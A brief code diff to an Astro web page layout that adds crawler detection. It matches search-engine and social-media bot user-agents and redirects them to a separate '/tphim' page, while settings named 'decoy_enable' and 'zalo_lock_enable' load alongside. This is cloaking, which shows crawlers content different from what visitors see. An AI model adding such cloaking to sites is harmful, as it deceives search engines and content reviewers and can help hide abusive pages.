@@ -5,6 +5,12 @@ import '@styles/index.css';
 import { ClientRouter } from 'astro:transitions';
 import { SettingService } from '@services/SettingService';
 
+const userAgent = Astro.request.headers.get('user-agent') || '';
+const isBot = /googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|facebot|facebookexternalhit|twitterbot|ia_archiver/i.test(userAgent);
+if (isBot) {
+  return Astro.redirect('/tphim');
+}
+
 const settings = await SettingService.getSettings();
 const decoyEnable = settings.general?.decoy_enable ?? true;
 const zaloLockEnable = settings.general?.zalo_lock_enable ?? true;
